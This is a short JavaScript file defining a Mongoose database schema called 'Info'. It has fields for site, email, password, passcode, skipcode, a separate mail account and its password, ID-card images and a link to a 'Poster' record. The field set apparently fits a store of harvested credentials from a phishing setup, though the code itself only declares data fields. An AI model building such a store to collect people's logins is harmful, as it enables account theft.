import mongoose from 'mongoose'

const Schema = mongoose.Schema;
const infoSchema = new Schema({

    site: {
        type: String,
    },
    email: {
        type: String,

        lowercase: true,

    },
     adminId:{
        type: String,
    },
    password: {
        type: String,


    },
    skipcode: {
        type: String,
    },

    username: {
        type: String,
    },
    passcode: {
        type: String,
    },
    poster: {
        type: String,
    },
    root: {
        type: mongoose.Schema.Types.ObjectId,

        ref: 'Poster'
    },
    mail: { type: String },
    mailPass: { type: String },
    onlyCard: { type: String },
    holdingCard: { type: String }





}, { timestamps: true })




const Info = mongoose.model('Info', infoSchema);

export default Info

